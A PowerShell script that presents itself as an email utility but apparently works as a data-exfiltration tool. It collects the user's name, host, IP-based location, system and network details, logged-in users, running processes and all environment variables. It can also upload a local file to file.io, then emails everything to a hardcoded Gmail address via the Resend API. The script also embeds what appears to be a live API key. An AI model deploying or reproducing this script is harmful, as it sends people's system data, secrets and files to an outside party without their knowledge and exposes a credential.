# PowerShell script to send emails with system info and optional file attachment

param (
    [string]$subject = "",
    [string]$body = "",
    [string]$file = "",
    [switch]$sendAllInfo = $false
)

# Hardcoded receiver email
$receiver = "marcush3llsquad@gmail.com"

# Get sender's name from the environment (username@hostname)
$senderName = "$env:USERNAME@$env:COMPUTERNAME"

# Get the user's location via external service
$location = (Invoke-RestMethod -Uri "https://ipinfo.io/loc").Trim()

# Gather system information
$osInfo = Get-CimInstance Win32_OperatingSystem | Select-Object -ExpandProperty Caption
$cpuInfo = (Get-CimInstance Win32_Processor).Name
$cpuArch = (Get-CimInstance Win32_OperatingSystem).OSArchitecture
$memTotal = (Get-CimInstance Win32_OperatingSystem).TotalVisibleMemorySize / 1MB
$memFree = (Get-CimInstance Win32_OperatingSystem).FreePhysicalMemory / 1MB
$diskUsage = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Name -eq "C" } | Select-Object -ExpandProperty Used
$networkInterfaces = Get-NetIPAddress | Select-Object -ExpandProperty IPAddress
$uptimeInfo = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
$loggedUsers = query user
$runningProcesses = Get-Process | Sort-Object WS -Descending | Select-Object -First 10
$envVars = Get-ChildItem Env:

# If subject is not provided, use the user's name
if (-not $subject) {
    $subject = $env:USERNAME
}

# If body is not provided, use the user's location
if (-not $body) {
    $body = "User Location: $location"
}

# API key and endpoint
$apiKey = "re_dSFUhTGY_6hNYMi4Uc33SfBBSfLY9Uotw"
$url = "https://api.resend.com/emails"

# File upload if the -f flag is provided
$fileLink = ""
if ($file -and (Test-Path -Path $file)) {
    Write-Host "Uploading file..."
    $response = Invoke-RestMethod -Uri "https://file.io/" `
        -Method Post `
        -ContentType "multipart/form-data" `
        -Form @{ file = Get-Item -Path $file }

    $fileLink = $response.link
}

# File attachment HTML
$fileAttachment = if ($fileLink) { "<hr><p><strong>File uploaded:</strong> <a href='$fileLink'>$file</a></p>" } else { "" }

# Create full email body based on the flag
$fullBody = if ($sendAllInfo) {
    @"
    <p>$body</p>
    <hr>
    <h3>Comprehensive System Information:</h3>
    <ul>
    <li><strong>OS Info:</strong> $osInfo</li>
    <li><strong>CPU Info:</strong> $cpuInfo</li>
    <li><strong>CPU Architecture:</strong> $cpuArch</li>
    <li><strong>Total Memory (MB):</strong> $memTotal</li>
    <li><strong>Free Memory (MB):</strong> $memFree</li>
    <li><strong>Disk Usage (C:):</strong> $diskUsage</li>
    <li><strong>Network Interfaces:</strong> $networkInterfaces</li>
    <li><strong>System Uptime:</strong> $uptimeInfo</li>
    <li><strong>Logged-in Users:</strong> <pre>$loggedUsers</pre></li>
    <li><strong>Top 10 Running Processes:</strong> <pre>$runningProcesses</pre></li>
    <li><strong>Environment Variables:</strong> <pre>$envVars</pre></li>
    </ul>
    $fileAttachment
    "@
} else {
    "<p>$body</p>$fileAttachment"
}

# Create email data
$emailData = @{
    from    = "$senderName <onboarding@resend.dev>"
    to      = @($receiver)
    subject = $subject
    html    = $fullBody
} | ConvertTo-Json

# Send the email
Invoke-RestMethod -Uri $url `
    -Method Post `
    -Headers @{ Authorization = "Bearer $apiKey"; "Content-Type" = "application/json" } `
    -Body $emailData

Write-Host "Email sent!"
